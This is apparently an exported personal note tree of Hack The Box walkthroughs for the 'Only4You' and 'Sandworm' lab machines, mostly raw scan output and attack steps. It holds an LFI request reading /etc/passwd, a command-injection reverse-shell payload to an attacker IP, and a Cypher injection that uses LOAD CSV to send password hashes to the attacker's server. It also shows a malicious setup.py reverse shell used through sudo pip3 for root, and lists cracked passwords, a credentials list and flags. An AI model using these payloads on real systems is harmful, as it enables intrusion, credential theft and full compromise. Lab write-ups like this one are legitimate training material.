2023/08/09 04:08:22 Finished
===============================================================





feroxbuster -u </rich_text>
        <rich_text link="webs http://beta.only4you.htb/">http://beta.only4you.htb/</rich_text>
        <rich_text> 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://beta.only4you.htb/">http://beta.only4you.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       37l       58w      674c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET       37l       59w      683c </rich_text>
        <rich_text link="webs http://beta.only4you.htb/download">http://beta.only4you.htb/download</rich_text>
        <rich_text>
200      GET       43l      292w    20031c </rich_text>
        <rich_text link="webs http://beta.only4you.htb/source">http://beta.only4you.htb/source</rich_text>
        <rich_text>
200      GET       62l      178w     2760c </rich_text>
        <rich_text link="webs http://beta.only4you.htb/convert">http://beta.only4you.htb/convert</rich_text>
        <rich_text>
200      GET       69l      186w     2984c </rich_text>
        <rich_text link="webs http://beta.only4you.htb/resize">http://beta.only4you.htb/resize</rich_text>
        <rich_text>
200      GET       52l      145w     2191c </rich_text>
        <rich_text link="webs http://beta.only4you.htb/">http://beta.only4you.htb/</rich_text>
        <rich_text>
200      GET      134l      333w     5934c </rich_text>
        <rich_text link="webs http://beta.only4you.htb/list">http://beta.only4you.htb/list</rich_text>
        <rich_text>
200      GET        1l        9w      948c </rich_text>
        <rich_text link="webs http://beta.only4you.htb/static/img/image-resize.svg">http://beta.only4you.htb/static/img/image-resize.svg</rich_text>
        <rich_text>
[####################] - 33s    30016/30016   0s      found:7       errors:0      
[####################] - 32s    30000/30000   924/s   </rich_text>
        <rich_text link="webs http://beta.only4you.htb/">http://beta.only4you.htb/</rich_text>
        <rich_text>                                                                                                     </rich_text>
      </node>
      <node name="exploit" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691568699" ts_lastsave="1691590674">
        <rich_text>download the source code

see that download is vulnerable to LFI

POST /download HTTP/1.1
Host: beta.only4you.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: </rich_text>
        <rich_text link="webs http://beta.only4you.htb">http://beta.only4you.htb</rich_text>
        <rich_text>
Connection: close
Referer: </rich_text>
        <rich_text link="webs http://beta.only4you.htb/list">http://beta.only4you.htb/list</rich_text>
        <rich_text>
Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiSW1hZ2UgZG9lc24ndCBleGlzdCEiXX1dfQ.ZNNNlg.nwUzRQeamwftGUDMGhZGVD-HENQ
Upgrade-Insecure-Requests: 1

image=/etc/passwd


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 09 Aug 2023 08:30:23 GMT
Content-Type: application/octet-stream
Content-Length: 2079
Connection: close
Content-Disposition: attachment; filename=passwd
Last-Modified: Thu, 30 Mar 2023 12:12:20 GMT
Cache-Control: no-cache
ETag: "1680178340.2049809-2079-393413677"

</rich_text>
        <rich_text weight="heavy">root:x:0:0:root:/root:/bin/bash</rich_text>
        <rich_text>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</rich_text>
        <rich_text weight="heavy">john:x:1000:1000:john:/home/john:/bin/bash</rich_text>
        <rich_text>
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
</rich_text>
        <rich_text weight="heavy">neo4j:x:997:997::/var/lib/neo4j:/bin/bash</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">dev:x:1001:1001::/home/dev:/bin/bash</rich_text>
        <rich_text>
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false


do LFI on nginx conf to find var/www

image=/etc/nginx/nginx.conf
image=/etc/nginx/sites-enabled/default

image=/var/www/only4you.htb/app.py

this shows form import

image=/var/www/only4you.htb/form.py

we see that function issecure uses “run”

we can do command injection if we bypass the regexp

name=test&amp;email=test2%40test.com;/bin/bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.21/9001+0&gt;%261'&amp;subject=test3&amp;message=test4

nc -lvnp 9001  
listening on [any] 9001 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.125.2] 60736
bash: cannot set terminal process group (1000): Inappropriate ioctl for device
bash: no job control in this shell
www-data@only4you:~/only4you.htb$ whoami 
whoami
www-data
www-data@only4you:~/only4you.htb$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@only4you:~/only4you.htb$

python3 -c 'import pty;pty.spawn("/bin/bash")'
control + z
stty raw -echo
fg
export TERM=xterm

run linpeas.sh

we run chisel


./chisel server --port 8081 --reverse
2023/08/09 07:29:17 server: Reverse tunnelling enabled
2023/08/09 07:29:17 server: Fingerprint vR+W/do572BAdZKo+wuX8aQPtitOOsbeweuLUEGJeS4=
2023/08/09 07:29:17 server: Listening on </rich_text>
        <rich_text link="webs http://0.0.0.0:8081">http://0.0.0.0:8081</rich_text>
        <rich_text>
2023/08/09 07:29:24 server: session#1: tun: proxy#R:7474=&gt;74: Listening
2023/08/09 07:29:31 server: session#2: tun: proxy#R:7474=&gt;7474: Listening
2023/08/09 07:30:24 server: session#7: tun: proxy#R:7687=&gt;7687: Listening


./chisel client 10.10.14.21:8081 R:7687:127.0.0.1:7687
./chisel client 10.10.14.21:8081 R:7474:127.0.0.1:7474
./chisel client 10.10.14.21:8081 R:8001:127.0.0.1:8001
./chisel client 10.10.14.21:8081 R:3000:127.0.0.1:3000


visit </rich_text>
        <rich_text link="webs http://127.0.0.1:8001/">http://127.0.0.1:8001/</rich_text>
        <rich_text>

login with admin:admin

cypher injection on search in employees

</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j</rich_text>
        <rich_text>

' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM '</rich_text>
        <rich_text link="webs http://10.10.14.21:8000/?version='">http://10.10.14.21:8000/?version='</rich_text>
        <rich_text> + version + '&amp;name=' + name + '&amp;edition=' + edition as l RETURN 0 as _0 // 

python3 -m http.server 8000 
Serving HTTP on 0.0.0.0 port 8000 (</rich_text>
        <rich_text link="webs http://0.0.0.0:8000/">http://0.0.0.0:8000/</rich_text>
        <rich_text>) ...
10.129.125.2 - - [09/Aug/2023 08:03:20] code 400, message Bad request syntax ('GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1')
10.129.125.2 - - [09/Aug/2023 08:03:20] "GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1" 400 -


' OR 1=1 WITH 1 as a  CALL db.labels() YIELD label LOAD CSV FROM '</rich_text>
        <rich_text link="webs http://10.10.14.21:8000/?version='">http://10.10.14.21:8000/?l='</rich_text>
        <rich_text> + label as l RETURN 0 as _0 // 

10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=user HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=employee HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=user HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=employee HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=user HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=employee HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=user HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=employee HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=user HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:07:44] "GET /?l=employee HTTP/1.1" 200 -


' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM '</rich_text>
        <rich_text link="webs http://10.0.2.4:8000/?'">http://10.10.14.21:8000/?'</rich_text>
        <rich_text> + p +'='+toString(f[p]) as l RETURN 0 as _0 //

10.129.125.2 - - [09/Aug/2023 08:45:30] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:30] "GET /?username=admin HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:30] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:30] "GET /?username=john HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:30] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:30] "GET /?username=admin HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?username=john HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?username=admin HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?username=john HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?username=admin HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?username=john HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:31] "GET /?username=admin HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:32] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.125.2 - - [09/Aug/2023 08:45:32] "GET /?username=john HTTP/1.1" 200 -


check hashes in crackstation

john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:admin


ssh john@10.129.125.2                                                          
john@10.129.125.2's password:
Last login: Tue Apr 18 07:46:32 2023 from 10.10.14.40
john@only4you:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
john@only4you:~$ whoami
john
john@only4you:~$ cat user.txt 
61bf50addc59e79147ab3a6a5ec67328

run linpeas.sh

john@only4you:/dev/shm$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
    


create a python package

</rich_text>
        <rich_text link="webs https://betterscientificsoftware.github.io/python-for-hpc/tutorials/python-pypi-packaging/">https://betterscientificsoftware.github.io/python-for-hpc/tutorials/python-pypi-packaging/</rich_text>
        <rich_text>

add to setup.py

import os
os.system("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.21/9001 0&gt;&amp;1'")

then run 

python3 setup.py sdist --formats=gztar


upload tar.gz to gops

then download on the server

john@only4you:/dev/shm$ sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/Test/raw/master/example-0.1.0.tar.gz
Collecting </rich_text>
        <rich_text link="webs http://127.0.0.1:3000/john/Test/raw/master/example-0.1.0.tar.gz">http://127.0.0.1:3000/john/Test/raw/master/example-0.1.0.tar.gz</rich_text>
        <rich_text>
  Downloading </rich_text>
        <rich_text link="webs http://127.0.0.1:3000/john/Test/raw/master/example-0.1.0.tar.gz">http://127.0.0.1:3000/john/Test/raw/master/example-0.1.0.tar.gz</rich_text>
        <rich_text> (1.3 kB)
  Saved ./example-0.1.0.tar.gz
Successfully downloaded example


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.125.2] 41036
root@only4you:/tmp/pip-req-build-tfhvktny# id
id
uid=0(root) gid=0(root) groups=0(root)
root@only4you:/tmp/pip-req-build-tfhvktny# cd /root
cd /root
root@only4you:~# ls
ls
root.txt
scripts
root@only4you:~# cat root.txt
cat root.txt
c8798f23b93339249a704010c678934a
root@only4you:~# ^C
</rich_text>
      </node>
    </node>
    <node name="Sandworm" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691672812" ts_lastsave="1691747091">
      <node name="nmap" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691672815" ts_lastsave="1691673015">
        <rich_text>sudo nmap -p- -sC -sV 10.129.229.16 -oA nmap/all -v
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-10 09:09 EDT
Nmap scan report for 10.129.229.16
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs https://ssa.htb/">https://ssa.htb/</rich_text>
        <rich_text>
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
| MD5:   b8b7:487e:f3e2:14a4:999e:f842:0141:59a1
|_SHA-1: 80d9:2367:8d7b:43b2:526d:5d61:00bd:66e9:48dd:c223
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 37.84 seconds
           Raw packets sent: 65598 (2.886MB) | Rcvd: 65537 (2.622MB)</rich_text>
      </node>
      <node name="buster" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691672818" ts_lastsave="1691674135">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs https://ssa.htb/">https://ssa.htb/</rich_text>
        <rich_text> -k 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs https://ssa.htb/">https://ssa.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      229c </rich_text>
        <rich_text link="webs https://ssa.htb/logout">https://ssa.htb/logout</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs https://ssa.htb/login?next=%2Flogout">https://ssa.htb/login?next=%2Flogout</rich_text>
        <rich_text>
200      GET       83l      249w     4392c </rich_text>
        <rich_text link="webs https://ssa.htb/login">https://ssa.htb/login</rich_text>
        <rich_text>
302      GET        5l       22w      227c </rich_text>
        <rich_text link="webs https://ssa.htb/admin">https://ssa.htb/admin</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs https://ssa.htb/login?next=%2Fadmin">https://ssa.htb/login?next=%2Fadmin</rich_text>
        <rich_text>
200      GET       69l      261w     3543c </rich_text>
        <rich_text link="webs https://ssa.htb/contact">https://ssa.htb/contact</rich_text>
        <rich_text>
200      GET       77l      554w     5584c </rich_text>
        <rich_text link="webs https://ssa.htb/about">https://ssa.htb/about</rich_text>
        <rich_text>
200      GET       23l       44w      668c </rich_text>
        <rich_text link="webs https://ssa.htb/static/scripts.js">https://ssa.htb/static/scripts.js</rich_text>
        <rich_text>
200      GET        6l      374w    21258c </rich_text>
        <rich_text link="webs https://ssa.htb/static/popper.min.js">https://ssa.htb/static/popper.min.js</rich_text>
        <rich_text>
200      GET        1l       10w    41992c </rich_text>
        <rich_text link="webs https://ssa.htb/static/favicon.ico">https://ssa.htb/static/favicon.ico</rich_text>
        <rich_text>
200      GET      155l      691w     9043c </rich_text>
        <rich_text link="webs https://ssa.htb/guide">https://ssa.htb/guide</rich_text>
        <rich_text>
200      GET     1346l     6662w    63667c </rich_text>
        <rich_text link="webs https://ssa.htb/static/bootstrap-icons.css">https://ssa.htb/static/bootstrap-icons.css</rich_text>
        <rich_text>
200      GET        7l     1031w    78130c </rich_text>
        <rich_text link="webs https://ssa.htb/static/bootstrap.bundle.min.js">https://ssa.htb/static/bootstrap.bundle.min.js</rich_text>
        <rich_text>
200      GET     2019l    10020w    95610c </rich_text>
        <rich_text link="webs https://ssa.htb/static/bootstrap-icons2.css">https://ssa.htb/static/bootstrap-icons2.css</rich_text>
        <rich_text>
200      GET        3l     1297w    89477c </rich_text>
        <rich_text link="webs https://ssa.htb/static/jquery.min.js">https://ssa.htb/static/jquery.min.js</rich_text>
        <rich_text>
200      GET    12292l    23040w   222220c </rich_text>
        <rich_text link="webs https://ssa.htb/static/styles.css">https://ssa.htb/static/styles.css</rich_text>
        <rich_text>
200      GET      304l     1591w   115308c </rich_text>
        <rich_text link="webs https://ssa.htb/static/eagl2.png">https://ssa.htb/static/eagl2.png</rich_text>
        <rich_text>
302      GET        5l       22w      225c </rich_text>
        <rich_text link="webs https://ssa.htb/view">https://ssa.htb/view</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs https://ssa.htb/login?next=%2Fview">https://ssa.htb/login?next=%2Fview</rich_text>
        <rich_text>
200      GET      155l      691w     9043c </rich_text>
        <rich_text link="webs https://ssa.htb/guide/verify">https://ssa.htb/guide/verify</rich_text>
        <rich_text>
200      GET      155l      691w     9043c </rich_text>
        <rich_text link="webs https://ssa.htb/guide/encrypt">https://ssa.htb/guide/encrypt</rich_text>
        <rich_text>
405      GET        5l       20w      153c </rich_text>
        <rich_text link="webs https://ssa.htb/process">https://ssa.htb/process</rich_text>
        <rich_text>
200      GET    10161l    60431w  4580604c </rich_text>
        <rich_text link="webs https://ssa.htb/static/circleLogo2.png">https://ssa.htb/static/circleLogo2.png</rich_text>
        <rich_text>
200      GET      124l      634w     8161c </rich_text>
        <rich_text link="webs https://ssa.htb/">https://ssa.htb/</rich_text>
        <rich_text>
200      GET       54l       61w     3187c </rich_text>
        <rich_text link="webs https://ssa.htb/pgp">https://ssa.htb/pgp</rich_text>
        <rich_text>
[####################] - 80s    30021/30021   0s      found:22      errors:0      
[####################] - 80s    30000/30000   375/s   </rich_text>
        <rich_text link="webs https://ssa.htb/">https://ssa.htb/</rich_text>
        <rich_text>



gobuster vhost -u </rich_text>
        <rich_text link="webs https://ssa.htb">https://ssa.htb</rich_text>
        <rich_text> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs https://ssa.htb">https://ssa.htb</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/08/10 09:28:28 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4934 / 4990 (98.88%)
===============================================================
2023/08/10 09:28:48 Finished
===============================================================
</rich_text>
      </node>
      <node name="nikto" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691673093" ts_lastsave="1691673461">
        <rich_text>nikto -h </rich_text>
        <rich_text link="webs https://ssa.htb/">https://ssa.htb/</rich_text>
        <rich_text>      
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.229.16
+ Target Hostname:    ssa.htb
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=SA/ST=Classified/L=Classified/O=Secret Spy Agency/OU=SSA/CN=SSA/emailAddress=atlas@ssa.htb
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=SA/ST=Classified/L=Classified/O=Secret Spy Agency/OU=SSA/CN=SSA/emailAddress=atlas@ssa.htb
+ Start Time:         2023-08-10 09:11:29 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</rich_text>
        <rich_text>
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security</rich_text>
        <rich_text>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: </rich_text>
        <rich_text link="webs https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</rich_text>
        <rich_text>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: The Content-Encoding header is set to "deflate" which may mean that the server is vulnerable to the BREACH attack. See: </rich_text>
        <rich_text link="webs http://breachattack.com/">http://breachattack.com/</rich_text>
        <rich_text>
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ Hostname 'ssa.htb' does not match certificate's names: SSA. See: </rich_text>
        <rich_text link="webs https://cwe.mitre.org/data/definitions/297.html">https://cwe.mitre.org/data/definitions/297.html</rich_text>
        <rich_text>
+ /static/favicon.ico: Server may leak inodes via ETags, header found with file /static/favicon.ico, inode: 1675149222.0, size: 15406, mtime: 550440530. See: </rich_text>
        <rich_text link="webs http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</rich_text>
        <rich_text>
+ /static/favicon.ico: Uncommon header 'content-disposition' found, with contents: inline; filename=favicon.ico.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS .</rich_text>
      </node>
      <node name="creds" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691676242" ts_lastsave="1691679302">
        <rich_text>silentobserver:quietLiketheWind22
atlas:GarlicAndOnionZ42
tipnet:4The_Greater_GoodJ4A</rich_text>
      </node>
      <node name="exploit" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691673260" ts_lastsave="1691684062">
        <rich_text>atlas@ssa.htb on website

try SSTI on website django or jinja2

</rich_text>
        <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://pgptool.org/">https://pgptool.org/</rich_text>
        <rich_text>

create pgp keys with ssti payload

{{config.items()}}

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: Keybase OpenPGP v2.0.76
Comment: </rich_text>
        <rich_text link="webs https://keybase.io/crypto">https://keybase.io/crypto</rich_text>
        <rich_text>

xo0EZNTr+QEEAMcQSodY6kBm2XtYlvw7mkOxmJUNwsTs+WUOZtVFpesdUX0+Lip5
5yKeZSvSP3wQTDBh4vgASdgRAg62XPmkkIdrtFo6ECaVw6BRxy0KJlCtWUPd5ASk
